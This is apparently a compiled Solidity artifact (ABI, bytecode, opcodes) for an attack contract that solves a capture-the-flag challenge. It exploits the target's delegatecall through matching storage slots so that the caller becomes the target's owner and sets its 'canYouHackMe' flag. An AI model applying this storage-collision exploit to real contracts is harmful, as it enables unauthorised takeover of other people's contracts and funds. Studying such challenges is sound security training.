{"contracts/attackdelegate.sol":{"AttackD31eg4t3":{"abi":[{"inputs":[{"internalType":"address","name":"_targetcontractaddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"attackd31eg4t3contract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"canYouHackMe","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"delegatecontract","outputs":[{"internalType":"contract D31eg4t3","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"_owneraddress","type":"address"}],"name":"setownerAndhackme","outputs":[],"stateMutability":"nonpayable","type":"function"}],"evm":{"bytecode":{"linkReferences":{},"object":"60806040526130396000556020600160006101000a81548160ff021916908360ff16021790555034801561003257600080fd5b50604051610934380380610934833981810160405281019061005491906100fe565b80600760006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061012b565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100cb826100a0565b9050919050565b6100db816100c0565b81146100e657600080fd5b50565b6000815190506100f8816100d2565b92915050565b6000602082840312156101145761011361009b565b5b6000610122848285016100e9565b91505092915050565b6107fa8061013a6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806329a2392c1461005c5780633d6b68d11461007a57806384ba692b146100845780638da5cb5b146100a0578063941de147146100be575b600080fd5b6100646100ee565b60405161007191906103ed565b60405180910390f35b610082610114565b005b61009e6004803603810190610099919061045a565b61028c565b005b6100a8610328565b6040516100b59190610496565b60405180910390f35b6100d860048036038101906100d3919061045a565b61034e565b6040516100e591906104cc565b60405180910390f35b600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600760009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663124ca3aa336040516024016101659190610496565b6040516020818303038152906040527f84ba692b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518263ffffffff1660e01b81526004016101fe9190610577565b6000604051808303816000875af115801561021d573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f8201168201806040525081019061024691906106eb565b50905080610289576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610280906107a4565b60405180910390fd5b50565b80600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001600660008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60066020528060005260406000206000915054906101000a900460ff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103b36103ae6103a98461036e565b61038e565b61036e565b9050919050565b60006103c582610398565b9050919050565b60006103d7826103ba565b9050919050565b6103e7816103cc565b82525050565b600060208201905061040260008301846103de565b92915050565b6000604051905090565b600080fd5b600080fd5b60006104278261036e565b9050919050565b6104378161041c565b811461044257600080fd5b50565b6000813590506104548161042e565b92915050565b6000602082840312156104705761046f610412565b5b600061047e84828501610445565b91505092915050565b6104908161041c565b82525050565b60006020820190506104ab6000830184610487565b92915050565b60008115159050919050565b6104c6816104b1565b82525050565b60006020820190506104e160008301846104bd565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610521578082015181840152602081019050610506565b60008484015250505050565b6000601f19601f8301169050919050565b6000610549826104e7565b61055381856104f2565b9350610563818560208601610503565b61056c8161052d565b840191505092915050565b60006020820190508181036000830152610591818461053e565b905092915050565b6105a2816104b1565b81146105ad57600080fd5b50565b6000815190506105bf81610599565b92915050565b600080fd5b600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6106078261052d565b810181811067ffffffffffffffff82111715610626576106256105cf565b5b80604052505050565b6000610639610408565b905061064582826105fe565b919050565b600067ffffffffffffffff821115610665576106646105cf565b5b61066e8261052d565b9050602081019050919050565b600061068e6106898461064a565b61062f565b9050828152602081018484840111156106aa576106a96105ca565b5b6106b5848285610503565b509392505050565b600082601f8301126106d2576106d16105c5565b5b81516106e284826020860161067b565b91505092915050565b6000806040838503121561070257610701610412565b5b6000610710858286016105b0565b925050602083015167ffffffffffffffff81111561073157610730610417565b5b61073d858286016106bd565b9150509250929050565b600082825260208201905092915050565b7f6661696c65642064656c65676174696f6e000000000000000000000000000000600082015250565b600061078e601183610747565b915061079982610758565b602082019050919050565b600060208201905081810360008301526107bd81610781565b905091905056fea26469706673582212204c60a29b9697aa76e4df44b029050d178341bc9589af957cd0c2b0aef3b6b85464736f6c63430008120033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE PUSH2 0x3039 PUSH1 0x0 SSTORE PUSH1 0x20 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x32 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x934 CODESIZE SUB DUP1 PUSH2 0x934 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x54 SWAP2 SWAP1 PUSH2 0xFE JUMP JUMPDEST DUP1 PUSH1 0x7 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x12B JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xCB DUP3 PUSH2 0xA0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xDB DUP2 PUSH2 0xC0 JUMP JUMPDEST DUP2 EQ PUSH2 0xE6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xF8 DUP2 PUSH2 0xD2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x114 JUMPI PUSH2 0x113 PUSH2 0x9B JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x122 DUP5 DUP3 DUP6 ADD PUSH2 0xE9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x7FA DUP1 PUSH2 0x13A PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x29A2392C EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0x3D6B68D1 EQ PUSH2 0x7A JUMPI DUP1 PUSH4 0x84BA692B EQ PUSH2 0x84 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xA0 JUMPI DUP1 PUSH4 0x941DE147 EQ PUSH2 0xBE JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x64 PUSH2 0xEE JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x71 SWAP2 SWAP1 PUSH2 0x3ED JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x82 PUSH2 0x114 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9E PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x45A JUMP JUMPDEST PUSH2 0x28C JUMP JUMPDEST STOP JUMPDEST PUSH2 0xA8 PUSH2 0x328 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xB5 SWAP2 SWAP1 PUSH2 0x496 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xD8 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xD3 SWAP2 SWAP1 PUSH2 0x45A JUMP JUMPDEST PUSH2 0x34E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xE5 SWAP2 SWAP1 PUSH2 0x4CC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x124CA3AA CALLER PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x165 SWAP2 SWAP1 PUSH2 0x496 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x84BA692B00000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1FE SWAP2 SWAP1 PUSH2 0x577 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x21D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x246 SWAP2 SWAP1 PUSH2 0x6EB JUMP JUMPDEST POP SWAP1 POP DUP1 PUSH2 0x289 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x280 SWAP1 PUSH2 0x7A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST DUP1 PUSH1 0x5 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 PUSH1 0x6 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x6 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3B3 PUSH2 0x3AE PUSH2 0x3A9 DUP5 PUSH2 0x36E JUMP JUMPDEST PUSH2 0x38E JUMP JUMPDEST PUSH2 0x36E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3C5 DUP3 PUSH2 0x398 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3D7 DUP3 PUSH2 0x3BA JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3E7 DUP2 PUSH2 0x3CC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x402 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x3DE JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x427 DUP3 PUSH2 0x36E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x437 DUP2 PUSH2 0x41C JUMP JUMPDEST DUP2 EQ PUSH2 0x442 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x454 DUP2 PUSH2 0x42E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x470 JUMPI PUSH2 0x46F PUSH2 0x412 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x47E DUP5 DUP3 DUP6 ADD PUSH2 0x445 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x490 DUP2 PUSH2 0x41C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4AB PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x487 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4C6 DUP2 PUSH2 0x4B1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4E1 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x4BD JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x521 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x506 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x549 DUP3 PUSH2 0x4E7 JUMP JUMPDEST PUSH2 0x553 DUP2 DUP6 PUSH2 0x4F2 JUMP JUMPDEST SWAP4 POP PUSH2 0x563 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x503 JUMP JUMPDEST PUSH2 0x56C DUP2 PUSH2 0x52D JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x591 DUP2 DUP5 PUSH2 0x53E JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x5A2 DUP2 PUSH2 0x4B1 JUMP JUMPDEST DUP2 EQ PUSH2 0x5AD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x5BF DUP2 PUSH2 0x599 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x607 DUP3 PUSH2 0x52D JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x626 JUMPI PUSH2 0x625 PUSH2 0x5CF JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x639 PUSH2 0x408 JUMP JUMPDEST SWAP1 POP PUSH2 0x645 DUP3 DUP3 PUSH2 0x5FE JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x665 JUMPI PUSH2 0x664 PUSH2 0x5CF JUMP JUMPDEST JUMPDEST PUSH2 0x66E DUP3 PUSH2 0x52D JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x68E PUSH2 0x689 DUP5 PUSH2 0x64A JUMP JUMPDEST PUSH2 0x62F JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x6AA JUMPI PUSH2 0x6A9 PUSH2 0x5CA JUMP JUMPDEST JUMPDEST PUSH2 0x6B5 DUP5 DUP3 DUP6 PUSH2 0x503 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x6D2 JUMPI PUSH2 0x6D1 PUSH2 0x5C5 JUMP JUMPDEST JUMPDEST DUP2 MLOAD PUSH2 0x6E2 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x67B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x702 JUMPI PUSH2 0x701 PUSH2 0x412 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x710 DUP6 DUP3 DUP7 ADD PUSH2 0x5B0 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 DUP4 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x731 JUMPI PUSH2 0x730 PUSH2 0x417 JUMP JUMPDEST JUMPDEST PUSH2 0x73D DUP6 DUP3 DUP7 ADD PUSH2 0x6BD JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6661696C65642064656C65676174696F6E000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x78E PUSH1 0x11 DUP4 PUSH2 0x747 JUMP JUMPDEST SWAP2 POP PUSH2 0x799 DUP3 PUSH2 0x758 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x7BD DUP2 PUSH2 0x781 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x4C PUSH1 0xA2 SWAP12 SWAP7 SWAP8 0xAA PUSH23 0xE4DF44B029050D178341BC9589AF957CD0C2B0AEF3B6B8 SLOAD PUSH5 0x736F6C6343 STOP ADDMOD SLT STOP CALLER "},"methodIdentifiers":{"attackd31eg4t3contract()":"3d6b68d1","canYouHackMe(address)":"941de147","delegatecontract()":"29a2392c","owner()":"8da5cb5b","setownerAndhackme(address)":"84ba692b"}}}}}